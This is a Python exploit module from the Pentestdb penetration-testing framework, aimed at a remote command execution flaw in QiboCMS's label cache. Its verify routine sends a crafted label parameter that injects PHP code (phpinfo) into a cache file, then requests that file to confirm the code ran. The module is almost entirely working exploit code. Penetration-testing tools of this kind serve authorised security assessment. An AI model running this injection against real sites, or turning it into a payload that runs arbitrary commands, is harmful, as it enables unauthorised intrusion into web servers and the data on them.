#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2015 alpha1e0
'''


from script.libs.exploit import Exploit
from script.libs.exploit import Result



class QibocmsRCE(Exploit):
    expName = u"齐博cms_标签缓存任意命令执行"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "qibocms"
    appVersion = "1.0"
    reference = ['http://www.wooyun.org/bugs/wooyun-2014-070366']
    description = u'''
        齐博cms 全系类版本
    '''

    def _verify(self):
        result = Result(self)
        
        phpPayload = "@phpinfo()"
        params = "?label[a'.\"${%s}\".'][asd]=aaaa'" %phpPayload

        sig = '_SERVER["HTTP_HOST"]'

        url = self.urlJoin("/index.php")
        response = self.http.get(url+params)

        url2 = url.replace("index.php","cache/label_cache/index_~1.php")
        response2 = self.http.get(url2)

        if response2.status_code == 200:
            if sig in response2.content:
                result['fullpath'] = self.url
                result['payload'] = str(phpPayload)

        return result
